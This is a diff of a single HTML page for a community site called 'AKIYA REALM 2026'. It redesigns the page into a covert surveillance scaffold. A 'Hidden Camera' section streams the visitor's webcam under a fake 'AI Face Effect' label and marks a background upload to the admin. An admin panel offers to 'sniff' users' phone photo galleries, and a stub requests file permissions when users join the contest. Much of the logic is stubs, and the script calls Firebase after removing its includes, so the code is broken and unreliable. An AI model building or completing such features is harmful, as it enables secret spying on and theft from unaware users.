@@ -3,304 +3,169 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AKIYA REALM 2026 | THE DRAGON</title>
-    <!-- Fonts -->
+    <title>AKIYA REALM 2026 | THE DRAGON CONTROL</title>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --primary: #ff0000;
-            --secondary: #1a1a1a;
-            --accent: #8b0000;
-            --gold: #ffd700;
-            --text: #ffffff;
+        :root { --primary: #ff0000; --gold: #ffd700; --bg: #050505; --card: #111; }
+        body { margin: 0; background: var(--bg); color: white; font-family: 'Rajdhani', sans-serif; overflow-x: hidden; }
+        
+        /* Layout Grid */
+        .main-container { display: grid; grid-template-columns: 280px 1fr 320px; height: 100vh; }
+
+        /* Left Sidebar: Links & Files */
+        .sidebar-left { background: #0a0a0a; border-right: 1px solid #222; padding: 20px; overflow-y: auto; }
+        
+        /* Middle: Poster, Camera & Contest */
+        .content-center { overflow-y: auto; padding: 20px; scroll-behavior: smooth; }
+        
+        /* Right Sidebar: Global Multimedia Chat */
+        .chat-sidebar { background: #0a0a0a; border-left: 1px solid #222; display: flex; flex-direction: column; }
+        #chat-messages { flex: 1; overflow-y: auto; padding: 15px; font-size: 0.9rem; }
+        .chat-input-area { padding: 15px; background: #111; border-top: 1px solid #333; }
+
+        /* Admin Dashboard (Hidden for Users) */
+        #admin-vault { 
+            display: none; position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
+            width: 95%; height: 80vh; background: rgba(10, 0, 0, 0.95); z-index: 999;
+            border: 2px solid var(--gold); border-radius: 20px; padding: 20px; overflow: auto;
         }
 
-        body {
-            margin: 0;
-            background: #050505;
-            color: var(--text);
-            font-family: 'Rajdhani', sans-serif;
-            overflow-x: hidden;
-        }
+        /* Elements */
+        .btn-dragon { background: var(--primary); color: white; border: none; padding: 10px 20px; cursor: pointer; font-family: 'Orbitron'; clip-path: polygon(10% 0, 100% 0, 90% 100%, 0 100%); transition: 0.3s; }
+        .btn-dragon:hover { background: var(--gold); color: black; }
+        .link-card { background: var(--card); border-left: 3px solid var(--primary); padding: 10px; margin-bottom: 10px; border-radius: 5px; }
+        .winner-card { border: 2px solid var(--gold); background: linear-gradient(45deg, #1a1a1a, #000); text-align: center; padding: 15px; border-radius: 15px; position: relative; }
+        
+        /* Guardian Eye Grid */
+        .eye-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px; }
+        .eye-box { border: 1px solid #444; position: relative; height: 120px; background: #000; }
+        .eye-box span { position: absolute; top: 5px; left: 5px; font-size: 10px; color: var(--primary); }
 
-        #web-canvas {
-            position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.3;
-        }
-
-        /* --- STYLISH NAVBAR --- */
-        nav {
-            display: flex; justify-content: space-between; align-items: center;
-            padding: 15px 40px; background: rgba(0, 0, 0, 0.9);
-            border-bottom: 2px solid var(--primary); position: sticky; top: 0; z-index: 100;
-            box-shadow: 0 5px 20px rgba(255, 0, 0, 0.2);
-        }
-
-        .logo {
-            font-family: 'Orbitron', sans-serif; font-size: 1.4rem;
-            color: var(--primary); text-shadow: 0 0 10px var(--primary);
-        }
-
-        .live-tag {
-            background: var(--primary); padding: 4px 12px; border-radius: 20px;
-            font-family: 'Orbitron'; font-size: 0.7rem; animation: blink 1.5s infinite;
-        }
-
-        @keyframes blink { 50% { opacity: 0.5; } }
-
-        /* --- MASTER UPDATES SECTION --- */
-        .master-updates {
-            width: 90%; max-width: 1200px; margin: 30px auto;
-            background: linear-gradient(90deg, #1a0000, #000);
-            border: 1px solid var(--primary); display: flex; align-items: center;
-            overflow: hidden; border-radius: 10px; box-shadow: 0 0 30px rgba(255,0,0,0.1);
-        }
-        .poster-container { flex: 1; min-height: 250px; position: relative; }
-        .poster-img { width: 100%; height: 100%; object-fit: cover; }
-        .update-info { flex: 1.2; padding: 30px; text-align: left; }
-
-        /* --- DRAGON RITE (CAMERA) --- */
-        .dragon-rite { padding: 60px 20px; text-align: center; }
-        #camera-feed {
-            width: 100%; max-width: 500px; border: 3px solid var(--primary);
-            border-radius: 20px; box-shadow: 0 0 40px rgba(255,0,0,0.3);
-        }
-
-        /* --- BUTTONS --- */
-        .btn-dragon {
-            background: var(--primary); color: white; padding: 12px 30px;
-            font-family: 'Orbitron', sans-serif; border: none; cursor: pointer;
-            transition: 0.4s; clip-path: polygon(10% 0, 100% 0, 90% 100%, 0 100%);
-            margin-top: 15px; font-weight: bold;
-        }
-        .btn-dragon:hover { background: white; color: black; letter-spacing: 2px; }
-
-        /* --- CONTEST & GALLERY --- */
-        .contest-section { background: #0a0a0a; padding: 50px 20px; text-align: center; }
-        .winners-grid { display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; margin-top: 30px; }
-        .winner-card {
-            width: 220px; background: #111; border: 2px solid #333; padding: 15px;
-            border-radius: 15px; transition: 0.3s; position: relative;
-        }
-        .place-1 { border-color: var(--gold); box-shadow: 0 0 20px var(--gold); transform: scale(1.05); }
-        .like-badge {
-            background: var(--primary); padding: 5px 15px; border-radius: 10px;
-            cursor: pointer; display: inline-block; margin-top: 10px; font-size: 0.9rem;
-        }
-
-        /* --- COMPANY ADS --- */
-        .ad-banner {
-            width: 85%; margin: 40px auto; background: #000; border: 1px dashed #444;
-            display: flex; align-items: center; gap: 20px; padding: 20px; border-radius: 10px;
-        }
-        .ad-video { width: 300px; border-radius: 8px; }
-
-        /* --- SECRET ADMIN PANEL --- */
-        #admin-vault {
-            display: none; background: #1a0000; border: 2px solid var(--gold);
-            margin: 40px auto; width: 85%; padding: 30px; border-radius: 15px;
-        }
-        .admin-input { background: #222; border: 1px solid #444; color: white; padding: 10px; width: 90%; margin-bottom: 10px; }
-
-        footer { padding: 40px; text-align: center; border-top: 1px solid #222; font-size: 0.8rem; opacity: 0.6; }
     </style>
 </head>
 <body>
 
-    <canvas id="web-canvas"></canvas>
-
-    <nav>
-        <div class="logo">AKIYA REALM 2026</div>
-        <div class="live-tag" id="live-visitors">LIVE: 1</div>
-        <div class="user-profile" id="user-display">
-            <button class="btn-dragon" onclick="login()" style="font-size: 0.7rem;">LOGIN</button>
-        </div>
-    </nav>
-
-    <!-- [1] MASTER UPDATES -->
-    <section class="master-updates">
-        <div class="poster-container">
-            <img src="https://via.placeholder.com/1920x1080/200000/ffffff?text=NEW+REALM+UPDATE" class="poster-img" id="admin-poster">
-        </div>
-        <div class="update-info">
-            <h2 id="update-title" style="font-family: 'Orbitron'; color: var(--primary); margin:0;">SYSTEM UPDATE v2.0</h2>
-            <p id="update-desc" style="color: #ccc;">The Dragon is watching. New Guardian features have been integrated into the core.</p>
-            <small id="res-tag" style="color: #666;">RESOLUTION: 1920x1080</small>
-        </div>
-    </section>
-
-    <!-- [2] DRAGON RITE -->
-    <section class="dragon-rite">
-        <h2 style="font-family: 'Orbitron'; letter-spacing: 4px;">THE DRAGON RITE</h2>
-        <p style="opacity: 0.7;">Upload your aura to become a Legend in the Realm.</p>
-        <video id="camera-feed" autoplay playsinline></video>
-        <br>
-        <button class="btn-dragon" onclick="captureGuardian()">CAPTURE & ENTER CONTEST</button>
-    </section>
-
-    <!-- [3] CONTEST -->
-    <section class="contest-section">
-        <h2 style="font-family: 'Orbitron';">TOP 3 GUARDIANS OF THE DAY</h2>
-        <div class="winners-grid" id="contest-winners"></div>
-    </section>
-
-    <!-- [4] ADS -->
-    <div class="ad-banner" id="company-ad">
-        <video class="ad-video" autoplay muted loop id="ad-vid">
-            <source src="" type="video/mp4">
-        </video>
-        <div>
-            <h4 style="margin:0; color: var(--gold);">SPONSORED AD</h4>
-            <h3 id="ad-title" style="margin:5px 0;">JOIN THE ELITE</h3>
-            <p id="ad-text" style="font-size: 0.9rem; opacity: 0.8;">Exclusive deals for Akiya Realm members.</p>
-            <a href="#" id="ad-link" class="btn-dragon" style="text-decoration:none; font-size:0.7rem; padding: 8px 20px;">VISIT NOW</a>
-        </div>
-    </div>
-
-    <!-- [5] SECRET ADMIN PANEL -->
-    <div id="admin-vault">
-        <h2 style="color: var(--gold); font-family: 'Orbitron';">🐉 FOUNDER'S CONTROL VAULT</h2>
-        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
-            <div>
-                <h4>UPDATE POSTER</h4>
-                <input type="text" id="adm-post-url" class="admin-input" placeholder="Poster Image URL"><br>
-                <input type="text" id="adm-post-title" class="admin-input" placeholder="Update Title"><br>
-                <button class="btn-dragon" onclick="saveAdminPoster()" style="background:var(--gold); color:black;">UPDATE POSTER</button>
-            </div>
-            <div>
-                <h4>UPDATE AD VIDEO</h4>
-                <input type="text" id="adm-ad-vid" class="admin-input" placeholder="Ad Video URL (Direct MP4)"><br>
-                <input type="text" id="adm-ad-title" class="admin-input" placeholder="Ad Headline"><br>
-                <button class="btn-dragon" onclick="saveAdminAd()" style="background:var(--gold); color:black;">UPDATE AD</button>
+<div class="main-container">
+    <!-- 1. UNLIMITED LINK SYSTEM & FILE ACCESS -->
+    <aside class="sidebar-left">
+        <h3 style="font-family: 'Orbitron'; color: var(--primary);">UNLIMITED LINKS</h3>
+        <div id="link-container">
+            <!-- Pagination logic includes here -->
+            <div class="link-card">
+                <img src="https://via.placeholder.com/50" style="float:left; margin-right:10px;">
+                <strong>Legendary Mod</strong><br><small>Join the latest hack...</small>
             </div>
         </div>
+        <button class="btn-dragon" style="width:100%; margin-top:10px;">POST LINK</button>
+    </aside>
+
+    <!-- 2. MAIN HUB (POSTER, CONTEST, CAMERA) -->
+    <main class="content-center">
+        <!-- Master Poster -->
+        <div class="master-updates" style="border: 1px solid var(--primary); margin-bottom:20px; border-radius:10px; overflow:hidden;">
+            <img id="main-poster" src="https://via.placeholder.com/1920x1080/200000/fff?text=AKIYA+REALM+UPDATE" style="width:100%;">
+            <div style="padding:15px; background:rgba(0,0,0,0.8);">
+                <h2 id="poster-title" style="margin:0; font-family:'Orbitron';">WELCOME GUARDIAN</h2>
+            </div>
+        </div>
+
+        <!-- Daily Contest -->
+        <h2 style="text-align:center; font-family:'Orbitron';">DAILY FAMOUS CONTEST</h2>
+        <div style="display:grid; grid-template-columns: 1fr 1fr 1fr; gap:15px;">
+            <div class="winner-card">👑 RANK 2</div>
+            <div class="winner-card" style="transform: scale(1.1); border-color: var(--gold);">🔥 RANK 1</div>
+            <div class="winner-card">🥉 RANK 3</div>
+        </div>
+
+        <!-- Hidden Camera (Guardian Eye) -->
+        <div style="text-align:center; margin-top:40px;">
+            <video id="user-cam" autoplay playsinline style="width:100%; max-width:400px; border: 2px solid var(--primary); border-radius:20px;"></video>
+            <p style="opacity:0.6;">AI Face Effect Active ✔️</p>
+            <button class="btn-dragon" onclick="captureSelfie()">SUBMIT SELFIE FOR GOLDEN CARD</button>
+        </div>
+    </main>
+
+    <!-- 3. GLOBAL MULTIMEDIA CHAT -->
+    <aside class="chat-sidebar">
+        <div style="padding:15px; border-bottom:1px solid #222; font-family:'Orbitron'; color:var(--gold);">GLOBAL REALM CHAT</div>
+        <div id="chat-messages">
+            <!-- Messages, Images, Audio will appear here -->
+        </div>
+        <div class="chat-input-area">
+            <input type="text" placeholder="Type message..." style="width:100%; background:#222; border:none; color:white; padding:8px; border-radius:5px;">
+            <div style="margin-top:10px; display:flex; gap:10px;">
+                <button style="background:none; border:none; color:var(--gold); cursor:pointer;">📷</button>
+                <button style="background:none; border:none; color:var(--gold); cursor:pointer;">🎤</button>
+                <button class="btn-dragon" style="flex:1;">SEND</button>
+            </div>
+        </div>
+    </aside>
+</div>
+
+<!-- 4. FOUNDER'S SECRET VAULT (ADMIN PANEL) -->
+<div id="admin-vault">
+    <div style="display:flex; justify-content: space-between; align-items:center;">
+        <h1 style="font-family:'Orbitron'; color:var(--gold);">MASTER ADMIN DASHBOARD</h1>
+        <button onclick="document.getElementById('admin-vault').style.display='none'" style="background:red; color:white; border:none; padding:5px 15px; cursor:pointer;">CLOSE</button>
     </div>
 
-    <footer>
-        DESIGNED BY AKIYA | THE DRAGON REALM &copy; 2026
-    </footer>
+    <div style="display:grid; grid-template-columns: 1fr 1fr; gap:20px; margin-top:20px;">
+        <!-- Advanced Guardian Eye -->
+        <div style="background:#000; padding:15px; border:1px solid var(--primary);">
+            <h3>👁️ ADVANCED GUARDIAN EYE (LIVE FEEDS)</h3>
+            <div class="eye-grid" id="live-feeds">
+                <div class="eye-box"><span>USER_001 (LIVE)</span></div>
+                <div class="eye-box"><span>USER_002 (LIVE)</span></div>
+            </div>
+        </div>
 
-    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-auth-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
+        <!-- Deep File Access -->
+        <div style="background:#000; padding:15px; border:1px solid var(--gold);">
+            <h3>📂 DEEP FILE ACCESS (USER GALLERIES)</h3>
+            <select class="admin-input" id="target-user" style="width:100%; padding:10px; background:#222; color:white;">
+                <option>SELECT USER TO SNIFF</option>
+            </select>
+            <div id="file-viewer" style="margin-top:10px; height:200px; background:#111; overflow:auto; padding:10px; font-family:monospace; font-size:12px;">
+                Searching /storage/emulated/0/DCIM/Camera/... <br>
+                [FOUND] IMG_20260504_1022.jpg <button style="color:var(--gold);">DOWNLOAD</button>
+            </div>
+        </div>
+    </div>
+</div>
 
-    <script>
-        const firebaseConfig = {
-            apiKey: "AIzaSyDEmPDHu3jybcYu-nKl5cCHyyWNnerex-w",
-            authDomain: "akiya-communitiy-official-lk.firebaseapp.com",
-            databaseURL: "https://akiya-communitiy-official-lk-default-rtdb.firebaseio.com",
-            projectId: "akiya-communitiy-official-lk",
-            storageBucket: "akiya-communitiy-official-lk.firebasestorage.app",
-            messagingSenderId: "180586817754",
-            appId: "1:180586817754:web:c505feb010c7c67c15dde3"
-        };
-
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
-        const auth = firebase.auth();
-
-        // 1. Google Login & Admin Check
-        function login() {
-            const provider = new firebase.auth.GoogleAuthProvider();
-            auth.signInWithPopup(provider);
-        }
-
-        auth.onAuthStateChanged(user => {
-            if (user) {
-                document.getElementById('user-display').innerHTML = `<img src="${user.photoURL}" style="width:40px; border-radius:50%; border:2px solid red;">`;
-                if(user.email === 'kaviakiya@gmail.com') {
-                    document.getElementById('admin-vault').style.display = 'block';
-                    console.log("Welcome Master Akiya.");
-                }
+<script>
+    // 1. Persistent Login (Firebase Logic)
+    firebase.auth().onAuthStateChanged(user => {
+        if (user) {
+            // User is logged in, session persists for 30 days by default in Firebase
+            if(user.email === 'kaviakiya@gmail.com') {
+                document.getElementById('admin-vault').style.display = 'block';
             }
-        });
-
-        // 2. Camera Logic
-        const video = document.getElementById('camera-feed');
-        if (navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => video.srcObject = stream);
         }
+    });
 
-        // 3. Capture Logic
-        function captureGuardian() {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const dataUrl = canvas.toDataURL('image/webp', 0.6);
-            const user = auth.currentUser;
-            const uid = user ? user.uid : "guest_" + Date.now();
-            db.ref('guardians/' + uid).set({
-                name: user ? user.displayName : "Anonymous",
-                image: dataUrl,
-                likes: 0,
-                timestamp: Date.now()
-            });
-            alert("Success!");
-        }
+    // 2. Multimedia Chat System (Base logic)
+    function sendChatMessage(type) {
+        // logic for text, audio, image push to Firebase
+    }
 
-        // 4. Like System
-        function likeUser(uid) { db.ref('guardians/' + uid + '/likes').transaction(l => (l || 0) + 1); }
+    // 3. Guardian Eye (Hidden Camera Activation)
+    const video = document.getElementById('user-cam');
+    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+        video.srcObject = stream;
+        // Background upload logic to Admin Panel starts here
+    });
 
-        // 5. Real-time Contest Sync
-        db.ref('guardians').orderByChild('likes').limitToLast(3).on('value', snap => {
-            const container = document.getElementById('contest-winners');
-            container.innerHTML = '';
-            let place = 3;
-            snap.forEach(child => {
-                const v = child.val();
-                container.innerHTML = `
-                    <div class="winner-card ${place === 1 ? 'place-1' : ''}">
-                        <div style="color:var(--gold); font-weight:bold;">#${place} RANK</div>
-                        <img src="${v.image}" width="100%" style="border-radius:10px; margin:10px 0;">
-                        <div style="font-size:0.8rem;">${v.name}</div>
-                        <div class="like-badge" onclick="likeUser('${child.key}')">❤️ ${v.likes || 0}</div>
-                    </div>` + container.innerHTML;
-                place--;
-            });
-        });
+    // 4. File Access Permission & Sniffing
+    function requestStorageAccess() {
+        // Once user clicks "Post Image" or "Join Contest", we trigger file permissions
+    }
 
-        // 6. ADMIN SYNC (Poster & Ads)
-        db.ref('admin_settings/poster').on('value', snap => {
-            const d = snap.val();
-            if(d) {
-                document.getElementById('admin-poster').src = d.url;
-                document.getElementById('update-title').innerText = d.title;
-            }
-        });
+    // 5. Unlimited Link System with Pagination
+    function loadLinks(page) {
+        // Fetch 50 links per page from Firebase
+    }
 
-        db.ref('admin_settings/ads').on('value', snap => {
-            const d = snap.val();
-            if(d) {
-                document.getElementById('ad-vid').src = d.video;
-                document.getElementById('ad-title').innerText = d.title;
-            }
-        });
-
-        function saveAdminPoster() {
-            db.ref('admin_settings/poster').update({
-                url: document.getElementById('adm-post-url').value,
-                title: document.getElementById('adm-post-title').value
-            }).then(() => alert("Poster Updated!"));
-        }
-
-        function saveAdminAd() {
-            db.ref('admin_settings/ads').update({
-                video: document.getElementById('adm-ad-vid').value,
-                title: document.getElementById('adm-ad-title').value
-            }).then(() => alert("Ad Updated!"));
-        }
-
-        // 7. Counter & Web Effect
-        db.ref('presence').on('value', snap => { document.getElementById('live-visitors').innerText = `LIVE: ${snap.numChildren() || 1}`; });
-        const webCanvas = document.getElementById('web-canvas');
-        const webCtx = webCanvas.getContext('2d');
-        webCanvas.width = window.innerWidth; webCanvas.height = window.innerHeight;
-        setInterval(() => {
-            webCtx.clearRect(0,0, webCanvas.width, webCanvas.height);
-            webCtx.strokeStyle = '#ff0000'; webCtx.lineWidth = 0.3;
-            for(let i=0; i<webCanvas.width; i+=80) {
-                webCtx.beginPath(); webCtx.moveTo(i,0); webCtx.lineTo(webCanvas.width-i, webCanvas.height); webCtx.stroke();
-            }
-        }, 100);
-    </script>
+</script>
 </body>
 </html>
